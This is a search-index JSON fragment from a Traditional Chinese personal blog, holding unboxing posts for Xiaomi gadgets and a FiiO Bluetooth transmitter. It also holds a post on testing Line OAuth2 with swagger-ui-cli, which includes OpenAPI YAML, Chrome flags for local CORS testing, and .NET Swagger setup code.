小米直立風冷無線充電座開箱","uri":"/blog/posts/50W-%E5%B0%8F%E7%B1%B3%E7%9B%B4%E7%AB%8B%E9%A2%A8%E5%86%B7%E7%84%A1%E7%B7%9A%E5%85%85%E9%9B%BB%E5%BA%A7%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"開箱 這個袋子可以留下來當防塵。 充電時候風扇才會開始轉動，當手機移開充電座，風扇就會提指運作。手靠過去可以感受微弱的風。我這隻 MIX2S 已經用很久了，電池電量沒辦法用很久，所以用這個充電衝到8X%就會停了，但有可能是我手機問題，我也沒有別支手機可以測試。 ","date":"2022-11-09","objectID":"/blog/posts/50W-%E5%B0%8F%E7%B1%B3%E7%9B%B4%E7%AB%8B%E9%A2%A8%E5%86%B7%E7%84%A1%E7%B7%9A%E5%85%85%E9%9B%BB%E5%BA%A7%E9%96%8B%E7%AE%B1/:1:0","tags":["mi"],"title":"50W 小米直立風冷無線充電座開箱","uri":"/blog/posts/50W-%E5%B0%8F%E7%B1%B3%E7%9B%B4%E7%AB%8B%E9%A2%A8%E5%86%B7%E7%84%A1%E7%B7%9A%E5%85%85%E9%9B%BB%E5%BA%A7%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"說明書 中文說明書 ","date":"2022-11-09","objectID":"/blog/posts/50W-%E5%B0%8F%E7%B1%B3%E7%9B%B4%E7%AB%8B%E9%A2%A8%E5%86%B7%E7%84%A1%E7%B7%9A%E5%85%85%E9%9B%BB%E5%BA%A7%E9%96%8B%E7%AE%B1/:2:0","tags":["mi"],"title":"50W 小米直立風冷無線充電座開箱","uri":"/blog/posts/50W-%E5%B0%8F%E7%B1%B3%E7%9B%B4%E7%AB%8B%E9%A2%A8%E5%86%B7%E7%84%A1%E7%B7%9A%E5%85%85%E9%9B%BB%E5%BA%A7%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"大陸有看到影片說噪音很大聲 首先我開始用是沒有什麼聲音，但我也不確定未來會不會發生這個問題。相關影片:【拆解】小米55W无线充电器，充电时候噪音很大，看看到底是什么原因？_哔哩哔哩_bilibili ","date":"2022-11-09","objectID":"/blog/posts/50W-%E5%B0%8F%E7%B1%B3%E7%9B%B4%E7%AB%8B%E9%A2%A8%E5%86%B7%E7%84%A1%E7%B7%9A%E5%85%85%E9%9B%BB%E5%BA%A7%E9%96%8B%E7%AE%B1/:3:0","tags":["mi"],"title":"50W 小米直立風冷無線充電座開箱","uri":"/blog/posts/50W-%E5%B0%8F%E7%B1%B3%E7%9B%B4%E7%AB%8B%E9%A2%A8%E5%86%B7%E7%84%A1%E7%B7%9A%E5%85%85%E9%9B%BB%E5%BA%A7%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"總結 這篇很短，這邊只是單純紀錄，老實說我覺得底座還是有缺點，像是網路上看到反著放不能充電，這邊有看到有人做 3D 列印做支架。我覺得很大缺點是支撐手機檔板太小，讓人有種不太穩的感覺，但其實很穩啦。好了本篇就小小的紀錄，其實主要順便把說明書電子化，以後有問題也可以回來看，哈哈。 ","date":"2022-11-09","objectID":"/blog/posts/50W-%E5%B0%8F%E7%B1%B3%E7%9B%B4%E7%AB%8B%E9%A2%A8%E5%86%B7%E7%84%A1%E7%B7%9A%E5%85%85%E9%9B%BB%E5%BA%A7%E9%96%8B%E7%AE%B1/:4:0","tags":["mi"],"title":"50W 小米直立風冷無線充電座開箱","uri":"/blog/posts/50W-%E5%B0%8F%E7%B1%B3%E7%9B%B4%E7%AB%8B%E9%A2%A8%E5%86%B7%E7%84%A1%E7%B7%9A%E5%85%85%E9%9B%BB%E5%BA%A7%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"最近在挑公司鍵盤，結果我看上Microsoft 微軟精巧藍芽鍵鼠組-霧光黑鍵盤，也有看到微軟設計師鍵盤，但藍芽 5.0 需要快 3000 塊。就有點超出預算，滑鼠也不是我要的，這邊原本想找有沒有一起賣又接到一起，但這邊沒有找到我要的滑鼠，這邊突然想到我之前買的小米藍芽滑鼠，不如就再買一個，順便開個箱。 ","date":"2022-11-08","objectID":"/blog/posts/CP%E8%B3%AA%E9%AB%98-%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E9%9B%99%E6%A8%A1%E6%BB%91%E9%BC%A0-%E9%9D%9C%E9%9F%B3%E7%89%88-%E9%96%8B%E7%AE%B1/:0:0","tags":["mi"],"title":"CP質高 小米無線雙模滑鼠 靜音版 開箱","uri":"/blog/posts/CP%E8%B3%AA%E9%AB%98-%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E9%9B%99%E6%A8%A1%E6%BB%91%E9%BC%A0-%E9%9D%9C%E9%9F%B3%E7%89%88-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"開箱 這邊就不詳細介紹。 ","date":"2022-11-08","objectID":"/blog/posts/CP%E8%B3%AA%E9%AB%98-%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E9%9B%99%E6%A8%A1%E6%BB%91%E9%BC%A0-%E9%9D%9C%E9%9F%B3%E7%89%88-%E9%96%8B%E7%AE%B1/:1:0","tags":["mi"],"title":"CP質高 小米無線雙模滑鼠 靜音版 開箱","uri":"/blog/posts/CP%E8%B3%AA%E9%AB%98-%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E9%9B%99%E6%A8%A1%E6%BB%91%E9%BC%A0-%E9%9D%9C%E9%9F%B3%E7%89%88-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"說明書 中文說明書 ","date":"2022-11-08","objectID":"/blog/posts/CP%E8%B3%AA%E9%AB%98-%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E9%9B%99%E6%A8%A1%E6%BB%91%E9%BC%A0-%E9%9D%9C%E9%9F%B3%E7%89%88-%E9%96%8B%E7%AE%B1/:2:0","tags":["mi"],"title":"CP質高 小米無線雙模滑鼠 靜音版 開箱","uri":"/blog/posts/CP%E8%B3%AA%E9%AB%98-%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E9%9B%99%E6%A8%A1%E6%BB%91%E9%BC%A0-%E9%9D%9C%E9%9F%B3%E7%89%88-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"總結 優點就是 CP 值高，300多就能有這麼短接收器，也有雙模鍵盤，也可以做藍芽和無線切換，甚至上下一頁兩個按鍵都有， 微軟要賣1000多才有，左右鍵我還覺得很小聲，但這個缺點應該是非常耗電， Mobile01 有人測出兩種模式耗電都是一樣的，我是有買 eneloop 充電電池，所以這對我影響沒有很大。 ","date":"2022-11-08","objectID":"/blog/posts/CP%E8%B3%AA%E9%AB%98-%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E9%9B%99%E6%A8%A1%E6%BB%91%E9%BC%A0-%E9%9D%9C%E9%9F%B3%E7%89%88-%E9%96%8B%E7%AE%B1/:3:0","tags":["mi"],"title":"CP質高 小米無線雙模滑鼠 靜音版 開箱","uri":"/blog/posts/CP%E8%B3%AA%E9%AB%98-%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E9%9B%99%E6%A8%A1%E6%BB%91%E9%BC%A0-%E9%9D%9C%E9%9F%B3%E7%89%88-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"第二次購買滑鼠壞掉 這次開箱剛好把舊的滑鼠帶去公司用，新的就在家裡使用，但沒有想到用了一個月就壞掉，剛好看到保固有 1年，剛好忠孝新生離我上班地點很近，我18:30下班，到那邊快要19:00，剛好 Safe到達。最後工作人員簡單測試，要你填寫收件地址，當天無法拿到新滑鼠，這點需要注意，發票記得要留，假如你要馬上使用的話可能會很困擾，但我家是有滑鼠就沒有這個問題。我是禮拜三送修，禮拜五就收到滑鼠，但一般你壞掉通常流程也會是這樣…，我平常也沒在整理發票，剛好開箱發票一直丟在桌上🤣，所以決定送去維修。 相關維修地點可以看這篇小米產品故障哪裡可維修？震旦通訊可幫忙送修嗎？過保固可以維修嗎？ ","date":"2022-11-08","objectID":"/blog/posts/CP%E8%B3%AA%E9%AB%98-%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E9%9B%99%E6%A8%A1%E6%BB%91%E9%BC%A0-%E9%9D%9C%E9%9F%B3%E7%89%88-%E9%96%8B%E7%AE%B1/:4:0","tags":["mi"],"title":"CP質高 小米無線雙模滑鼠 靜音版 開箱","uri":"/blog/posts/CP%E8%B3%AA%E9%AB%98-%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E9%9B%99%E6%A8%A1%E6%BB%91%E9%BC%A0-%E9%9D%9C%E9%9F%B3%E7%89%88-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"之前買 Sony WH-1000XM4 主要是用在 PC 聽音樂，不過我發現 PC 不能轉 LDAC 音訊，所以音質真的非常不好，適用 SBC 最爛的音訊，總覺得聽音樂就少了那種感覺，收聽LDAC藍牙耳機，除了Fiio BTA30 Pro有沒有其他方案 - Mobile01這篇討論看到解決方案，就買下開箱了。 ","date":"2022-11-08","objectID":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/:0:0","tags":["ldac","藍芽","fiio","sony"],"title":"唯一 PC 轉 SONY LDAC 傳音訊解決方案 FiiO BTA30 PRO 開箱","uri":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"注意買藍芽接收/發送問題 在這之前我看 BTR 7，以為這就可以解決我這個問題。但我看這個影片(12) FiiO最新BTR7迅速評測！彩色大螢幕真的好方便！！ - YouTube注意到，他這個是把有線耳機轉成無線，所以使用上要注意。 ","date":"2022-11-08","objectID":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/:1:0","tags":["ldac","藍芽","fiio","sony"],"title":"唯一 PC 轉 SONY LDAC 傳音訊解決方案 FiiO BTA30 PRO 開箱","uri":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"開箱 原本去光華，是順便看有沒有這個，中間問了很多家都沒有賣，在一間店發現竟然有賣這個東西。比 PChome 便宜 500元，只要4000整就可以買到。這邊不廢話，馬上進行開箱。 濕氣有點重?不過上面擦拭可以擦掉。 總共有 USB Type C、同軸音訊、意義不明腳貼、本體家說明書。 使用上還滿簡單，裝完會看到東西，聲音會覺得很小，但其實不用裝驅動。不過我後來裝了，因為聲音太小聲，下面我會提到。 ","date":"2022-11-08","objectID":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/:2:0","tags":["ldac","藍芽","fiio","sony"],"title":"唯一 PC 轉 SONY LDAC 傳音訊解決方案 FiiO BTA30 PRO 開箱","uri":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"說明書 中文說明書1 中文說明書2 中文說明書3 ","date":"2022-11-08","objectID":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/:3:0","tags":["ldac","藍芽","fiio","sony"],"title":"唯一 PC 轉 SONY LDAC 傳音訊解決方案 FiiO BTA30 PRO 開箱","uri":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"驅動 載點在這邊USB DAC driver download link, How to use the FiiO device as USB DAC?FiiO Community| FiiO forum| FiiO product official communication platform，下載FiiO USB DAC driver。安裝完下面會有F標示。 ","date":"2022-11-08","objectID":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/:4:0","tags":["ldac","藍芽","fiio","sony"],"title":"唯一 PC 轉 SONY LDAC 傳音訊解決方案 FiiO BTA30 PRO 開箱","uri":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"用 Sony 耳機聲音很小 原本我習慣調整 Sony 耳機聲音，他預設會控制電腦大小聲音，這邊我用 BTA30 PRO 聲音很小聲，我調整擴大機還是很小聲，結果發現要調整藍芽耳機大小聲，他不會調整電腦音量，這邊要特別注意。 我還以為我踩到機王，或驅動沒裝之類，好險都正常 ","date":"2022-11-08","objectID":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/:5:0","tags":["ldac","藍芽","fiio","sony"],"title":"唯一 PC 轉 SONY LDAC 傳音訊解決方案 FiiO BTA30 PRO 開箱","uri":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"簡單總結 音質室有提升，但要跟有線比當然不可能比較好，買這個是為了方便，相信有線還是比無線好，但可能每次收線都是很麻煩的事情。要不要特別買BTA30 PRO 就看個人意願了，只是不知道這種產品怎麼只有一種，真的很奇怪?? ","date":"2022-11-08","objectID":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/:6:0","tags":["ldac","藍芽","fiio","sony"],"title":"唯一 PC 轉 SONY LDAC 傳音訊解決方案 FiiO BTA30 PRO 開箱","uri":"/blog/posts/%E5%94%AF%E4%B8%80-PC-%E8%BD%89-SONY-LDAC-%E5%82%B3%E9%9F%B3%E8%A8%8A%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-FiiO-BTA30-PRO-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"坐進買了小米路由器 AC1200，發現他只有2 port LAN網路孔，不過有支援 5G WIFI ，之前我家WIFI是高中的，變壓器也非常燙，所以想更換，但好險握那間房間動物機有兩台，剛好 Port 直接這樣可以用，買的時候需要注意 Port。 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/:0:0","tags":["mi"],"title":"小米路由器AC1200開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"開箱 先說說箱子滑動裡面有感覺東西會滑動，這邊打開發現是變壓器和網路線沒固定好，但應該不會造成什麼受損，所以應該是還好。 打開看到 WIFI 四個天線。 網路線是 Cat 5E。 電源線是 12V/1A。 路由器後面可以用鉤子掛在牆壁上面。 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/:1:0","tags":["mi"],"title":"小米路由器AC1200開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"說明書 這邊為了方便，不全部掃描，做開箱文為了防止說明書不見，我可以在這邊做個備份。 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/:2:0","tags":["mi"],"title":"小米路由器AC1200開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"控制畫面 手機連WIFI機器開瀏覽器192.168.31.1或著router.miwifi.com就可以進去控制頁面。 右上角可以改語系，這邊要選地區才能進去。 我這邊不想用 PPPOE 撥接，所以就沒用這個，假如你不想讓你的 WIFI 對外，建議不要用這個。 然後照他圖片上面指示就可以用了。 本來想分開網段，不過後來找不到路由設定，但有看到中繼設定，所以就選擇這個模式。 我的動物機設定都不要調整。可喜可賀。不過下次我會網路朋友再請他幫忙設定網段看看，她說這樣比較穩，也有看到WIFI也有 vLan功能，不知道能不能用? 最後先設置成這樣。 重新進去輸入密碼是 WIFI 密碼。 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/:3:0","tags":["mi"],"title":"小米路由器AC1200開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"心得 首先我沒注意兩個網路孔問題，在裝置擴充可能要特別注意。但600多功能就不用強求太多，之後房間考慮是否要更換?不過目前是夠用，WIFI範圍還滿廣的，從我房間到外面客廳，再到我書房 Wifi 是滿格，這個範圍也太猛。 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/:4:0","tags":["mi"],"title":"小米路由器AC1200開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"彩蛋 XD SFan: 小米路由器 mini 刷機 openwrt ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/:5:0","tags":["mi"],"title":"小米路由器AC1200開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AC1200%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"這是一個簡易開箱小米無線吸塵器mini","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/","tags":["mi"],"title":"小米無線吸塵器mini開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"最近雙十一有折價卷，之前覺得吸塵器太大，吸小東西不是很方便，所以就順便買了小米無線吸塵器mini來用，其實這個東西網路上還滿多開箱，我當初沒注意到。 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/:0:0","tags":["mi"],"title":"小米無線吸塵器mini開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"開箱 打開側面我以為是從側邊抽出來，原來是從後背打開。 打開覺得有點小重，我還特別去用體重機確認是不是真的500公克。 這邊有更換濾心提示。 使用請充電，大約兩個小時，可以先拿下橘色標籤，先按下卡吮。 轉集塵杯解鎖後，可以上下拔開。 我覺得吸頭卡吮不好拔，我是放進去沒感覺有喀聲…，但也沒有很鬆。不知道這個會不會容易壞掉。 可以拉開下方過濾器，旋轉濾網後，可以取出濾心，我覺得橘色標籤可以那邊拿取，我從上方拿取非常困難，後來發現下面可以拉開… 後續可清理濾心。 這邊大概吸東西，東西大概會用在濾網上面。這好像是廢話。 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/:1:0","tags":["mi"],"title":"小米無線吸塵器mini開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"說明書 中文說明書 英文說明書 濾心更換說明書 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/:2:0","tags":["mi"],"title":"小米無線吸塵器mini開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"重要資訊 重量: 500 公克 充電:2小時 (第一次充電) 時間: 30分鐘(一般吸力) 9分鐘(強吸力) \u003c– 這部分是網路資訊 濾心更換: 3個月(說明書建議) 濾心可清水沖洗，但不可泡水。 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/:3:0","tags":["mi"],"title":"小米無線吸塵器mini開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"網路開箱影片 簡單基本開箱介紹 上面有詳細介紹使用說明 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/:4:0","tags":["mi"],"title":"小米無線吸塵器mini開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"感想 吸力我覺得還可以，但想要強力的吸力還是買大型的吸塵器會比較好。有小吸塵器需求才推薦購買，沒有需求不建議購買。上面影片都有提到缺點，濾網可能很重要，有時候在吸東西，風會往後吹，有時候臉朝這邊會被風吹到不是很舒服，但應該也只能這樣。我覺得第二缺點吸頭只有一個，吸某些地方還不是很方便，這部分有多個頭可能會好一點。 ","date":"2022-11-06","objectID":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/:5:0","tags":["mi"],"title":"小米無線吸塵器mini開箱","uri":"/blog/posts/%E5%B0%8F%E7%B1%B3%E7%84%A1%E7%B7%9A%E5%90%B8%E5%A1%B5%E5%99%A8mini%E9%96%8B%E7%AE%B1/"},{"categories":["實用工具"],"content":"前篇我們使用 Chrome 啟用 CORS 設定可以做跨域打 API，像使用 OpenAPI 瀏覽器都有關掉 CORS，所以在測試上都會很不方便。所以我在找 Chrome 有什麼方法可以做到這件事，這樣就不用自己寫 Electron 之類東西；我不太想用相關套件，因為之前有報過相關套件有些有會偷個資，有內建可繞過就很方便，最後爬到一篇可以用，Firefox沒有找到方法。 ","date":"2022-10-24","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-swagger-ui-cli-%E5%B7%A5%E5%85%B7%E7%9C%8B-OpenAPI-%E6%96%87%E4%BB%B6%E8%88%87%E6%B8%AC%E8%A9%A6/:0:0","tags":["swaggerui","openapi","Net Core"],"title":"使用 swagger-ui-cli 工具看 OpenAPI 文件與測試","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-swagger-ui-cli-%E5%B7%A5%E5%85%B7%E7%9C%8B-OpenAPI-%E6%96%87%E4%BB%B6%E8%88%87%E6%B8%AC%E8%A9%A6/"},{"categories":["實用工具"],"content":"實例 OAS 做 Line OAuth 首先用 Line 新增一個 OAuth Login，需要有一組 clientId和 secret。需要設定 redirectUrl 為http://127.0.0.1:8080/oauth2-redirect.html ，不然會進不去 Line Login。 openapi: '3.0.2' info: title: Line OAuth2 測試 version: '1.0' servers: - url: https://api.line.me paths: /v2/profile: get: responses: '200': description: OK content: application/json: schema: title: profileResponse type: object description: profile response data properties: user: type: string displayName: type: string pictureUrl: type: string components: securitySchemes: LineAccessCode: type: oauth2 flows: authorizationCode: authorizationUrl: https://access.line.me/oauth2/v2.1/authorize tokenUrl: https://api.line.me/oauth2/v2.1/token scopes: profile: \"\" openid: \"\" security: - LineAccessCode: [] 可以使用swagger-ui-cli - npm，來啟用 swagger ui 。 但我只不到別的方法，所以直接看程式哪裡出問題，直接 Fork 出來修正，希望作者能 PR 上去，希望能成為我第一個 PR 項目XD。(2022-10-24 作者已經 Merge) # 啟動 swagger ui swagger-ui ./openapi.yaml 我後來發現 http://127.0.0.1:8080/oauth2-redirect.html 帶參數會連不到，但是沒帶參數正常。 用我修改 PR項目可以解決問題。Fix Swagger UI OAuth2 Redirect URL with parameters return 404 Response. by malagege · Pull Request #3 · egomobile/swagger-ui-cli，最後我這個 PR 順利到 Merge 專案，0.14版本就可以正常使用。 使用上面貼的指令。 # MacOS (in Terminal) open -na Google\\ Chrome --args --user-data-dir=/tmp/temporary-chrome-profile-dir --disable-web-security --disable-site-isolation-trials # Windows (from \"Run\" dialog [Windows+R] or start menu in Windows 8+) chrome.exe --user-data-dir=%TMP%\\temporary-chrome-profile-dir --disable-web-security --disable-site-isolation-trials 就可以正常使用這個功能。 手動測試 profile API 可以取得到資料。 ","date":"2022-10-24","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-swagger-ui-cli-%E5%B7%A5%E5%85%B7%E7%9C%8B-OpenAPI-%E6%96%87%E4%BB%B6%E8%88%87%E6%B8%AC%E8%A9%A6/:1:0","tags":["swaggerui","openapi","Net Core"],"title":"使用 swagger-ui-cli 工具看 OpenAPI 文件與測試","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-swagger-ui-cli-%E5%B7%A5%E5%85%B7%E7%9C%8B-OpenAPI-%E6%96%87%E4%BB%B6%E8%88%87%E6%B8%AC%E8%A9%A6/"},{"categories":["實用工具"],"content":"番外 Net Core Swagger 程式設定 OAuth2 services.AddSwaggerGen(c =\u003e { c.SwaggerDoc(\"v1\", new OpenApiInfo { Title = \"Hybrid\", Version = \"v1\", Description = \"混合API使用\", }); // Set the comments path for the Swagger JSON and UI. var xmlFile = $\"{Assembly.GetExecutingAssembly().GetName().Name}.xml\"; var xmlPath = Path.Combine(AppContext.BaseDirectory, xmlFile); c.IncludeXmlComments(xmlPath, true); c.AddSecurityDefinition(\"Bearer\", new OpenApiSecurityScheme { In = ParameterLocation.Header, Description = \"Please insert JWT with Bearer into field\", Name = \"Authorization\", Type = SecuritySchemeType.ApiKey }); c.AddSecurityDefinition(\"Line\", new OpenApiSecurityScheme { Type = SecuritySchemeType.OAuth2, Flows = new OpenApiOAuthFlows() { AuthorizationCode = new OpenApiOAuthFlow() { AuthorizationUrl = new Uri(\"https://access.line.me/oauth2/v2.1/authorize\"), TokenUrl = new Uri(\"https://api.line.me/oauth2/v2.1/token\"), Scopes = { { \"profile\", \"\"}, { \"openid\", \"\"} } } } }); c.AddSecurityRequirement(new OpenApiSecurityRequirement { { new OpenApiSecurityScheme { Reference = new OpenApiReference { Type = ReferenceType.SecurityScheme, Id = \"Bearer\" } }, new string[] { } } }); c.AddSecurityRequirement(new OpenApiSecurityRequirement { { new OpenApiSecurityScheme { Reference = new OpenApiReference { Type = ReferenceType.SecurityScheme, Id = \"Line\" } }, new string[] { } } }); }); 